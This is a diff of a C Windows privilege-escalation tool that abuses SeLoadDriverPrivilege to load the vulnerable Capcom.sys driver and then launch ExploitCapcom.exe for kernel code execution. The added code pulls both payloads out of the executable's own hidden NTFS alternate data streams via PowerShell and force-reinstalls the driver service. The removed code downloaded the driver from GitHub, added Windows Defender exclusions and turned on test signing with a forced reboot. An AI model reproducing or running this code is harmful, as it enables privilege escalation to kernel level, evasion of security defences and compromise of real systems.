@@ -1,19 +1,9 @@
 /*
-Reference:
-https://github.com/hatRiot/token-priv
-https://github.com/TarlogicSecurity/EoPLoadDriver
-
 Compile with:
 x86_64-w64-mingw32-gcc -o SeLoadDriverPrivilege.exe SeLoadDriverPrivilege.c -lwininet -ladvapi32 -luser32
 
 Enable the SeLoadDriverPrivilege of current process and then load the driver into the kernel.
-
-Modified to compile with x86_64-w64-mingw32-gcc and download Capcom.sys automatically.
-
-The program will:
-1. Download Capcom.sys from GitHub to current directory
-2. Add required registry keys automatically
-3. Load the driver into the kernel
+The program extracts Capcom.sys and ExploitCapcom.exe from its own ADS streams and loads the driver.
 */
 
 #include <windows.h>
@@ -44,66 +34,120 @@ typedef NTSTATUS(NTAPI *NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
 typedef VOID(NTAPI *RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);
 typedef ULONG(NTAPI *RTL_NTSTATUS_TO_DOS_ERROR)(NTSTATUS Status);
 
-BOOL DownloadCapcomDriver(const char* url)
-{
-    HINTERNET hInternet, hConnect;
-    DWORD dwBytesRead, dwBytesWritten;
-    BYTE buffer[8192];
-    HANDLE hFile;
-    BOOL result = FALSE;
+BOOL IsPEFile(const BYTE* data, DWORD size) {
+    if (size < sizeof(IMAGE_DOS_HEADER)) return FALSE;
     
-    printf("[+] Downloading Capcom.sys from: %s\n", url);
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)data;
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
     
-    // Initialize WinINet
-    hInternet = InternetOpenA("DriverLoader/1.0", 
-                             INTERNET_OPEN_TYPE_PRECONFIG, 
-                             NULL, NULL, 0);
-    if (!hInternet) {
-        printf("[-] Failed to initialize internet connection\n");
-        return FALSE;
+    if (size < dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)) return FALSE;
+    
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(data + dosHeader->e_lfanew);
+    return ntHeader->Signature == IMAGE_NT_SIGNATURE;
+}
+
+BOOL ExtractFileFromADS(const WCHAR* selfPath, const WCHAR* streamName, const WCHAR* outputPath) {
+    printf("[*] Attempting to extract ADS...\n");
+    printf("[*] Self path: %ls\n", selfPath);
+    printf("[*] Stream name: %ls\n", streamName);
+    printf("[*] Output path: %ls\n", outputPath);
+
+    // First try without $DATA suffix
+    WCHAR fullStreamPath[MAX_PATH];
+    swprintf(fullStreamPath, MAX_PATH, L"%ls:%ls", selfPath, streamName);
+    
+    HANDLE hStream = CreateFileW(fullStreamPath, 
+                               GENERIC_READ, 
+                               FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
+                               NULL, 
+                               OPEN_EXISTING, 
+                               FILE_FLAG_SEQUENTIAL_SCAN, 
+                               NULL);
+
+    // If first attempt fails, try with explicit $DATA stream
+    if (hStream == INVALID_HANDLE_VALUE) {
+        swprintf(fullStreamPath, MAX_PATH, L"%ls:%ls:$DATA", selfPath, streamName);
+        printf("[*] Retrying with $DATA suffix: %ls\n", fullStreamPath);
+        
+        hStream = CreateFileW(fullStreamPath, 
+                            GENERIC_READ, 
+                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
+                            NULL, 
+                            OPEN_EXISTING, 
+                            FILE_FLAG_SEQUENTIAL_SCAN, 
+                            NULL);
     }
     
-    // Open URL
-    hConnect = InternetOpenUrlA(hInternet, 
-                               url,
-                               NULL, 0, 
-                               INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
-    if (!hConnect) {
-        printf("[-] Failed to open URL\n");
-        InternetCloseHandle(hInternet);
-        return FALSE;
-    }
-    
-    // Create local file
-    hFile = CreateFileA("Capcom.sys", 
-                       GENERIC_WRITE, 
-                       0, NULL, 
-                       CREATE_ALWAYS, 
-                       FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        printf("[-] Failed to create Capcom.sys file\n");
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
-        return FALSE;
-    }
-    
-    // Download file
-    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &dwBytesRead) && dwBytesRead > 0) {
-        if (!WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL) || 
-            dwBytesWritten != dwBytesRead) {
-            printf("[-] Failed to write to file\n");
-            goto cleanup;
+    if (hStream == INVALID_HANDLE_VALUE) {
+        DWORD error = GetLastError();
+        printf("[-] Failed to open stream %ls\n", streamName);
+        printf("[-] Full path attempted: %ls\n", fullStreamPath);
+        printf("[-] Error code: %lu\n", error);
+        if (error == ERROR_INVALID_NAME) {
+            printf("[-] Invalid file name format\n");
+        } else if (error == ERROR_FILE_NOT_FOUND) {
+            printf("[-] ADS stream not found - did you create it with 'type file.exe > program.exe:file.exe'?\n");
+        } else if (error == ERROR_ACCESS_DENIED) {
+            printf("[-] Access denied - try running as administrator\n");
         }
+        return FALSE;
     }
     
-    printf("[+] Successfully downloaded Capcom.sys\n");
-    result = TRUE;
+    DWORD fileSize = GetFileSize(hStream, NULL);
+    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
+        printf("[-] Failed to get stream size or stream is empty\n");
+        CloseHandle(hStream);
+        return FALSE;
+    }
     
-cleanup:
-    CloseHandle(hFile);
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
-    return result;
+    BYTE* fileData = (BYTE*)malloc(fileSize);
+    if (!fileData) {
+        printf("[-] Failed to allocate memory for file data\n");
+        CloseHandle(hStream);
+        return FALSE;
+    }
+    
+    DWORD bytesRead;
+    if (!ReadFile(hStream, fileData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
+        printf("[-] Failed to read stream data\n");
+        free(fileData);
+        CloseHandle(hStream);
+        return FALSE;
+    }
+    
+    CloseHandle(hStream);
+    
+    // Skip PE validation - raw binary data
+    printf("[*] Reading %lu bytes from stream\n", fileSize);
+    
+    // Write validated data to output file
+    HANDLE hOutput = CreateFileW(outputPath, 
+                               GENERIC_WRITE | GENERIC_READ, 
+                               FILE_SHARE_READ | FILE_SHARE_WRITE, 
+                               NULL, 
+                               CREATE_ALWAYS, 
+                               FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, 
+                               NULL);
+    
+    if (hOutput == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to create output file %ls: %lu\n", outputPath, GetLastError());
+        free(fileData);
+        return FALSE;
+    }
+    
+    DWORD bytesWritten;
+    BOOL success = WriteFile(hOutput, fileData, fileSize, &bytesWritten, NULL) && 
+                  bytesWritten == fileSize;
+    
+    if (!success) {
+        printf("[-] Failed to write to output file\n");
+    } else {
+        printf("[+] Successfully extracted %ls (Size: %lu bytes)\n", outputPath, fileSize);
+    }
+    
+    free(fileData);
+    CloseHandle(hOutput);
+    return success;
 }
 
 BOOL SetupRegistryKeys()
@@ -526,118 +570,97 @@ BOOL TriggerExploit()
     return TRUE;
 }
 
-// Attempt to disable Windows Defender
-BOOL DisableWindowsDefender() {
-    printf("[*] Adding current directory to Windows Defender exclusions...\n");
-    
-    HKEY hKey;
-    WCHAR currentDir[MAX_PATH];
-    LONG result;
 
-    // Get current directory
-    if (!GetCurrentDirectoryW(MAX_PATH, currentDir)) {
-        printf("[-] Failed to get current directory\n");
-        return FALSE;
-    }
-
-    // Open/Create Windows Defender exclusions key with full access
-    result = RegCreateKeyExW(HKEY_LOCAL_MACHINE,
-                            L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
-                            0, NULL,
-                            REG_OPTION_NON_VOLATILE,
-                            KEY_ALL_ACCESS,
-                            NULL,
-                            &hKey,
-                            NULL);
-
-    if (result != ERROR_SUCCESS) {
-        printf("[-] Failed to create/open Windows Defender exclusions key\n");
-        return FALSE;
-    }
-
-    // Add current directory to exclusions
-    DWORD value = 0;
-    result = RegSetValueExW(hKey,
-                           currentDir,
-                           0,
-                           REG_DWORD,
-                           (BYTE*)&value,
-                           sizeof(DWORD));
-
-    RegCloseKey(hKey);
-
-    if (result != ERROR_SUCCESS) {
-        printf("[-] Failed to add directory to exclusions\n");
-        return FALSE;
-    }
-
-    printf("[+] Added %ls to Windows Defender exclusions\n", currentDir);
-    return TRUE;
-}
-
-// Attempt to disable DSE
-BOOL DisableDSE() {
-    printf("[*] Attempting to disable Driver Signature Enforcement...\n");
-    
-    // Try to disable DSE using bcdedit
-    CHAR cmd[] = "bcdedit /set testsigning on >nul 2>&1";
-    if (system(cmd) != 0) {
-        printf("[-] Failed to disable DSE. Make sure you're running as administrator\n");
-        return FALSE;
-    }
-    
-    printf("[+] DSE should be disabled after restart\n");
-    printf("[*] System needs to be restarted for changes to take effect\n");
-    
-    // Ask user if they want to restart now
-    printf("[?] Do you want to restart the system now? (y/n): ");
-    char response;
-    scanf(" %c", &response);
-    if (response == 'y' || response == 'Y') {
-        printf("[*] Restarting system in 5 seconds...\n");
-        system("shutdown /r /t 5 /f");
-        exit(0);
-    }
-    
-    return TRUE;
-}
 
 int main(int argc, char* argv[])
 {
     HANDLE hToken;
-    const char* defaultUrl = "https://github.com/josemlwdf/random_scripts/raw/refs/heads/main/Capcom.sys";
-    const char* driverUrl = defaultUrl;
+    WCHAR selfPath[MAX_PATH];
     
-    printf("=== Capcom Driver Loader & Exploit ===\n");
+    printf("=== Capcom Driver Loader ===\n");
     
-    // Check if driver service is already installed
-    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+    // Get our own executable path
+    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH)) {
+        printf("[-] Failed to get executable path: %lu\n", GetLastError());
+        return 1;
+    }
+    
+    // Extract files from ADS using PowerShell
+    printf("[*] Extracting files using PowerShell...\n");
+    char selfPathA[MAX_PATH];
+    char psCmd[2048];
+    
+    // Convert wide string to multibyte
+    wcstombs(selfPathA, selfPath, MAX_PATH);
+    
+    // Extract files using multibyte strings
+    snprintf(psCmd, sizeof(psCmd),
+             "powershell -Command \"Get-Item -Path '%s' -Stream Capcom.sys | Get-Content -Encoding Byte -Raw | Set-Content -Encoding Byte -Path Capcom.sys\"",
+             selfPathA);
+    system(psCmd);
+    
+    snprintf(psCmd, sizeof(psCmd),
+             "powershell -Command \"Get-Item -Path '%s' -Stream ExploitCapcom.exe | Get-Content -Encoding Byte -Raw | Set-Content -Encoding Byte -Path ExploitCapcom.exe\"",
+             selfPathA);
+    system(psCmd); // This was the missing call!
+
+    // Verify files were extracted
+    HANDLE hFile = CreateFileA("Capcom.sys", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to verify Capcom.sys extraction\n");
+        return 1;
+    }
+    CloseHandle(hFile);
+
+    // Verify ExploitCapcom.exe extraction (single attempt as requested)
+    hFile = CreateFileA("ExploitCapcom.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to verify ExploitCapcom.exe extraction.\n");
+        return 1; 
+    }
+    CloseHandle(hFile); // Close the handle if successful
+    
+    printf("[+] Files extracted successfully\n");
+    
+    // If driver service is already installed, stop and delete it to allow for a clean reinstallation.
+    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hSCManager) {
         printf("[-] Failed to open SC Manager: %lu\n", GetLastError());
         return 1;
     }
 
-    SC_HANDLE hService = OpenServiceW(hSCManager, L"Capcom", SERVICE_QUERY_STATUS);
-    BOOL driverInstalled = (hService != NULL);
-    if (hService) CloseServiceHandle(hService);
-    CloseServiceHandle(hSCManager);
-
-    if (driverInstalled) {
-        printf("[*] Capcom driver is already installed, proceeding to exploit\n");
-    } else {
-        // Check if driver file exists in current directory
-        HANDLE hFile = CreateFileA("Capcom.sys", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            printf("[*] Found Capcom.sys in current directory, will install it\n");
-            CloseHandle(hFile);
-        } else {
-            printf("[*] Downloading Capcom driver...\n");
-            if (!DownloadCapcomDriver(driverUrl)) {
-                printf("[-] Failed to download driver\n");
-                return 1;
+    SC_HANDLE hService = OpenServiceW(hSCManager, L"Capcom", SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
+    if (hService) {
+        printf("[*] Existing Capcom service found. Attempting to stop and delete for reinstallation.\n");
+        SERVICE_STATUS status;
+        // Try to stop the service if it's running
+        if (QueryServiceStatus(hService, &status) && (status.dwCurrentState == SERVICE_RUNNING)) {
+            if (ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
+                printf("[+] Service stop command sent. Waiting for it to terminate...\n");
+                Sleep(2000); // Wait a bit for the service to stop
+            } else {
+                printf("[!] Failed to stop the service: %lu. Deletion might fail.\n", GetLastError());
             }
         }
+        
+        // Delete the service
+        if (!DeleteService(hService)) {
+            printf("[-] Failed to delete existing service: %lu. Reinstallation might fail.\n", GetLastError());
+        } else {
+            printf("[+] Existing service deleted successfully.\n");
+        }
+        CloseServiceHandle(hService);
     }
+    CloseServiceHandle(hSCManager);
+
+    // At this point, any pre-existing service should be gone. We can proceed with a fresh installation.
+    // Check if driver file exists in current directory before proceeding
+    hFile = CreateFileA("Capcom.sys", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[-] Capcom.sys not found in current directory, cannot proceed.\n");
+        return 1;
+    }
+    CloseHandle(hFile);
     
     // Get process token with all necessary access rights
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_ALL_ACCESS, &hToken)) {
@@ -662,61 +685,44 @@ int main(int argc, char* argv[])
     IsTokenSystem(hToken);
     GetTokenPrivilege(hToken);
 
-    // Try to disable security features
-    DisableWindowsDefender();
-    if (!DisableDSE()) {
-        printf("[!] Warning: Failed to disable DSE, exploit may fail\n");
-        printf("[!] Make sure you're running as Administrator\n");
-    }
-    
     printf("[+] Starting driver loading process...\n");
 
-    // If a parameter is passed, use it as the URL
-    if (argc > 1 && argv[1] && strlen(argv[1]) > 0) {
-        driverUrl = argv[1];
-        printf("[*] Using user-supplied driver URL: %s\n", driverUrl);
-    } else {
-        printf("[*] Using default driver URL: %s\n", driverUrl);
-    }
-    
     // Skip file and registry operations if driver is already installed
     
     ULONG result = 0;
     
-    // Only setup and load if driver isn't already installed
-    if (!driverInstalled) {
-        // Setup registry keys
-        if (!SetupRegistryKeys()) {
-            printf("[-] Failed to setup registry keys\n");
-            CloseHandle(hToken);
-            return 1;
-        }
-        
-        // Load the driver
-        result = LoadDriver(hToken);
-        if (result != 0) {
-            printf("[-] Driver loading failed with error: %lu\n", result);
-            CloseHandle(hToken);
-            return result;
-        }
+    // Setup registry keys
+    if (!SetupRegistryKeys()) {
+        printf("[-] Failed to setup registry keys\n");
+        CloseHandle(hToken);
+        return 1;
+    }
+    
+    // Load the driver
+    result = LoadDriver(hToken);
+    if (result != 0) {
+        printf("[-] Driver loading failed with error: %lu\n", result);
+        CloseHandle(hToken);
+        return result;
     }
     
     CloseHandle(hToken);
     
     if (result == 0) {
         printf("[+] Driver loaded successfully!\n");
-        printf("[+] Driver should now be loaded in kernel space.\n");
+        printf("[+] Launching ExploitCapcom.exe...\n");
         
-        // Exploit the loaded driver to run calc.exe
-        printf("\n[+] Now attempting to exploit the driver to run calc.exe...\n");
-        if (!TriggerExploit()) {
-            printf("[-] Exploit failed.\n");
-            result = 1; // Indicate failure
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        
+        if (!CreateProcessW(L"ExploitCapcom.exe", L"ExploitCapcom.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+            printf("[-] Failed to launch ExploitCapcom.exe: %lu\n", GetLastError());
+            result = 1;
         } else {
-            printf("[+] Exploit finished.\n");
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            printf("[+] ExploitCapcom.exe launched successfully\n");
         }
-    } else {
-        printf("[-] Driver loading failed with error: %lu\n", result);
     }
     
     if (result == 0) {
